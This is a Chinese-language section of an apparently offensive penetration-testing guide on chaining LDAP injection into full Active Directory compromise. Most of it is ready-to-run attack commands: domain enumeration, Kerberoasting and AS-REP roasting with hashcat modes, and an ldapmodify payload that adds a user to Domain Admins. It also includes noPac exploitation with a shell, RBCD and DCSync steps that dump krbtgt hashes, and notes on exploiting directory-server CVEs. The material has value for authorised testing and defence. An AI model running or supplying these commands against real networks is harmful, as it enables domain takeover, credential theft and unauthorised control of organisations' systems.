## 九、LDAP注入 → AD域渗透攻击链联动

### 9.1 注入 → 信息泄露 → 域枚举（BloodHound数据源）
```
# 通过注入获得的读权限可批量导出域图数据 → 灌入BloodHound找提权路径
windapsearch.py -d corp.local -u USER -p PASS --users --groups --da
ldapdomaindump -u corp.local\\USER -p PASS dc.corp.local -o ./dump
python3 bloodhound-python -u USER -p PASS -d corp.local -c All -ns DC_IP
# 注入点获得的"查询能力"完全等价于这些工具的LDAP查询 → 攻击面共享
```

### 9.2 注入 → 凭据获取 → Kerberoasting/AS-REP
```
# 注入拿到读权限后：
# Kerberoasting（SPN账户的TGS票据离线爆破）：
GetUserSPNs.py corp.local/USER:PASS -dc-ip DC -request
# AS-REP Roasting（无预认证账户）：
GetNPUsers.py corp.local/ -usersfile users.txt -dc-ip DC -no-pass
# 结合盲注提取的哈希/属性 → 离线破解（hashcat -m 13100/18200）
# gMSA提取（CVE-2026-58222面）：若能读取msKds-RootKeyData → gMSADump离线推导
```

### 9.3 注入 → 写操作 → 提权（改属性/加组/重置密码/sAMAccountName伪造）
```
# 若应用用注入点后的绑定身份执行Modify（高权限服务账号）：
# ① 改组成员：把普通用户加入Domain Admins
ldapmodify -x -D "cn=srv,dc=corp,dc=local" -w pass <<'EOF'
dn: CN=alice,CN=Users,DC=corp,DC=local
changetype: modify
add: memberOf
memberOf: CN=Domain Admins,CN=Users,DC=corp,DC=local
EOF
# ② 重置密码（需允许改unicodePwd）
# ③ 设置SPN → 制造Kerberoast目标 / 修改msDS-AllowedToActOnBehalfOfOtherIdentity → RBCD
# ④ noPac（CVE-2021-42278/42287）：通过LDAP把机器账户sAMAccountName改成DC名（去$后缀）
python3 noPac.py corp.local/USER:PASS -dc-ip DC -dc-host DC -shell
#     → Kerberos TGT冒用DC身份 → S4U2self → DCSync → 域管（已被广泛武器化，2026仍活跃于未修补环境）
```

### 9.4 完整攻击链案例（低权限 → 域管）
```
1. 登录接口存在过滤器注入（CVE-2026-42568式通配符）→ 用默认口令/已知口令接管低权用户 alice
2. 通过alice的LDAP读权限枚举：发现服务账户 svc_report 设置SPN且密码永不过期
3. Kerberoasting 获取 svc_report 的TGS → 离线破解出明文密码
4. svc_report 具有写权限（或注入点绑定的服务账号有写权限）：
   - 方案A：RBCD —— 为攻击者控制的机器账户设置 msDS-AllowedToActOnBehalfOfOtherIdentity → 以svc身份申请域管服务票据
   - 方案B：noPac —— 借写权限创建机器账户并改sAMAccountName为DC名 → DCSync
5. DCSync 导出 krbtgt/域管哈希 → 完全控制域
关键教训：注入 → 只是入口；链路价值在于后续每一步都要用LDAP查询/写入能力串起来
```

### 9.5 LDAP服务器自身漏洞面
```
# CVE-2026-58222 Samba AD DC（见3.5）：Compare属性名注入 → msKds-RootKeyData → gMSA → 域沦陷
# CVE-2026-11770 389 DS：预认证CleanAllRUV扩展操作过滤器注入 → 读cn=config复制bind DN/密码存储方案
#   检测：向389 DS发送CleanAllRUV状态检查扩展请求注入过滤器，观察布尔返回差异
# CVE-2021-42278/42287（noPac）、CVE-2020-1472（Zerologon，经LDAP改机器账户密码面）
# 建议：先测注入，再测目录服务自身已知CVE，两者可叠加
```

